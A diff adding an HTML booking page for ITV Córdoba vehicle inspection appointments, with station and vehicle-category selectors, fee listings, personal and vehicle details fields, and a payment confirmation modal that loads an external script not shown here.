@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ITV Córdoba - Turno General</title>
+    <link rel="icon" href="img/favicon.png" type="image/png" sizes="32x32">
+    <style>
+        /* RESET Y CONFIGURACIÓN GLOBAL */
+        html, body {
+            min-height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* HEADER Y NAVEGACIÓN */
+        header {
+            display: grid;
+            place-items: center;
+            padding: 0.8rem;
+            background: white;
+            flex-shrink: 0;
+        }
+        header img { max-width: 100%; height: auto; width: 300px; }
+
+        .nav-container {
+            display: flex;
+            justify-content: center;
+            background: white;
+            padding: 10px 0;
+            border-bottom: 1px solid #e1e4e8;
+            flex-shrink: 0;
+        }
+        .nav-links { 
+            display: flex; 
+            gap: 20px; 
+            font-size: 13px; 
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .nav-links a { text-decoration: none; color: #0056b3; font-weight: 500; }
+
+        /* LAYOUT PRINCIPAL RESPONSIVE */
+        main {
+            flex-grow: 1;
+            display: flex;
+            flex-wrap: wrap;
+            padding: 20px;
+            gap: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+            align-items: flex-start;
+        }
+
+        .card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border: 1px solid #dce1e6;
+            display: flex;
+            flex-direction: column;
+            box-sizing: border-box;
+        }
+
+        .col-form { flex: 1.3; padding: 25px; min-width: 320px; }
+        .col-map { flex: 1; padding: 15px; min-width: 300px; }
+
+        h1 { font-size: 1.3rem; color: #1f3a36; margin: 0 0 15px 0; border-bottom: 2px solid #3b82f6; display: inline-block; }
+        h3 { font-size: 0.85rem; margin: 15px 0 10px 0; color: #2c5282; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* FORMULARIO */
+        .form-group { margin-bottom: 12px; }
+        .form-row { display: flex; gap: 15px; }
+        .form-row > div { flex: 1; }
+
+        label { display: block; font-size: 0.75rem; font-weight: 600; color: #334155; margin-bottom: 4px; }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+        }
+        input:focus, select:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
+
+        /* BOTÓN SUBMIT */
+        .btn-submit {
+            width: 100%;
+            background-color: #2c5282;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover { background-color: #1a365d; }
+
+        #map { width: 100%; border-radius: 8px; background: #e2e8f0; min-height: 250px; }
+
+        /* MODAL */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        /* MEDIA QUERIES PARA CELULAR */
+        @media (max-width: 768px) {
+            main { flex-direction: column; padding: 10px; }
+            .col-form, .col-map { width: 100%; min-width: 0; }
+            .form-row { flex-direction: column; gap: 0; }
+            header img { width: 220px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="img/dual_logo.png" alt="ITV logo">
+    </header>
+    
+    <nav class="nav-container">
+        <div class="nav-links">
+            <a href="#">Perfil Corporativo</a>
+            <a href="#">Turnos</a>
+            <a href="#">Plantas</a>
+            <a href="#">Ayuda</a>
+        </div>
+    </nav>
+
+    <main>
+        <section class="card col-form">
+            <h1>Solicitud de Turno</h1>
+            <form id="appointmentForm">
+                <div class="form-group">
+                    <label>Seleccione Planta:</label>
+                    <select id="planta" name="planta" required>
+                        <option value="">- Seleccione Planta -</option>
+                        <option value="99">ITV 01 - Chateau</option>
+                        <option value="10">ITV 02 - Circunvalación</option>
+                        <option value="11">ITV 03 - Japón</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Tipo de Vehículo y Tarifa:</label>
+                    <select id="vehicleType" name="vehicleType" required>
+                        <option value="">- Seleccione Categoría -</option>
+                        <option value="33283">T1 - Automóviles particulares ($33.283,00)</option>
+                        <option value="11414">T2 - Motocicletas hasta 175 cc ($11.414,00)</option>
+                        <option value="17209">T3 - Motocicletas mayor a 175 cc ($17.209,00)</option>
+                        <option value="36993">T4 - Taxis y Remis ($36.993,00)</option>
+                        <option value="55077">T5 - Micro-ómnibus y Transp. Escolar ($55.077,00)</option>
+                        <option value="58934">T6 - Ómnibus ($58.934,00)</option>
+                        <option value="66701">T7 - Trolebuses ($66.701,00)</option>
+                        <option value="46440">T8 - Camionetas ($46.440,00)</option>
+                        <option value="64519">T9 - Camiones ($64.519,00)</option>
+                        <option value="35294">T10 - Remolques más de 5000 kg ($35.294,00)</option>
+                        <option value="23665">T11 - Remolques hasta 5000 kg ($23.665,00)</option>
+                        <option value="26665">T12 - Casas Rodantes ($26.665,00)</option>
+                        <option value="46440">T13 - Ambulancias ($46.440,00)</option>
+                    </select>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Fecha:</label>
+                        <input type="date" id="fecha" name="fecha" min="2026-02-06" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Hora:</label>
+                        <select id="hora" name="hora" required>
+                            <option value="">- Hora -</option>
+                            <option>09:00</option>
+                            <option>10:00</option>
+                            <option>11:00</option>
+                            <option>12:00</option>
+                            <option>13:00</option>
+                            <option>14:00</option>
+                            <option>15:00</option>
+                            <option>16:00</option>
+                        </select>
+                    </div>
+                </div>
+
+                <h3>Información del Titular</h3>
+                <div class="form-group">
+                    <label>Nombre y Apellido:</label>
+                    <input type="text" id="nombre" name="nombre" required placeholder="Juan Pérez">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Teléfono Celular:</label>
+                        <input type="tel" id="telefono" name="telefono" placeholder="351XXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Patente del Vehículo:</label>
+                        <input type="text" id="patente" name="patente" required placeholder="AB 123 CD">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Email de Contacto:</label>
+                    <input type="email" id="email" name="email" required placeholder="usuario@gmail.com">
+                </div>
+
+                <div style="font-size: 0.8rem; margin: 15px 0; display: flex; align-items: flex-start; gap: 8px;">
+                    <input type="checkbox" id="terms" required style="width: auto; margin-top: 3px;"> 
+                    <span>Acepto que la información brindada es correcta y acepto los términos y condiciones.</span>
+                </div>
+
+                <button type="submit" class="btn-submit">Siguiente</button>
+            </form>
+        </section>
+
+        <section class="card col-map">
+            <h3 style="margin: 0 0 10px 0; text-align: center;">Información de Planta</h3>
+            <div id="map">
+                </div>
+            <div style="margin-top: 15px; font-size: 0.7rem; color: #64748b; line-height: 1.4;">
+                <p><strong>Recuerde:</strong></p>
+                <ul>
+                    <li>Presentarse 15 minutos antes del turno.</li>
+                    <li>Llevar Cédula Verde y Carnet de Conducir.</li>
+                    <li>El pago debe estar acreditado antes de la inspección.</li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header" style="font-size: 1.2rem; font-weight: 700; text-align: center; border-bottom: 2px solid #3b82f6; padding-bottom: 10px; margin-bottom: 15px;">
+                Resumen de su Turno
+            </div>
+            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; font-size: 0.9rem;">
+                <tr><td style="padding: 8px 0; color: #64748b;">N° Trámite:</td><td style="text-align: right; font-weight: 700;" id="confirmationNumber">-</td></tr>
+                <tr><td style="padding: 8px 0; color: #64748b;">Titular:</td><td style="text-align: right; font-weight: 700;" id="modalName">-</td></tr>
+                <tr><td style="padding: 8px 0; color: #64748b;">Vehículo / Patente:</td><td style="text-align: right; font-weight: 700;" id="modalVehiclePlate">-</td></tr>
+                <tr><td style="padding: 8px 0; color: #64748b;">Planta ITV:</td><td style="text-align: right; font-weight: 700;" id="modalStation">-</td></tr>
+                <tr><td style="padding: 8px 0; color: #64748b;">Fecha y Hora:</td><td style="text-align: right; font-weight: 700;" id="modalDateTime">-</td></tr>
+                <tr><td style="padding: 15px 0 8px 0; color: #64748b;">Total a Pagar:</td><td style="text-align: right; font-weight: 700; color: #2c5282; font-size: 1.2rem;" id="modalPrice">-</td></tr>
+            </table>
+            <div style="display: flex; gap: 10px;">
+                <button id="modalModifyBtn" style="flex: 1; padding: 12px; border: none; border-radius: 6px; cursor: pointer; background: #f1f5f9; color: #475569; font-weight: 600;">Modificar</button>
+                <button id="modalConfirmBtn" style="flex: 1; padding: 12px; border: none; border-radius: 6px; cursor: pointer; background: #2c5282; color: white; font-weight: 700;">Confirmar y Pagar</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/reg.js"></script>
+</body>
+</html>
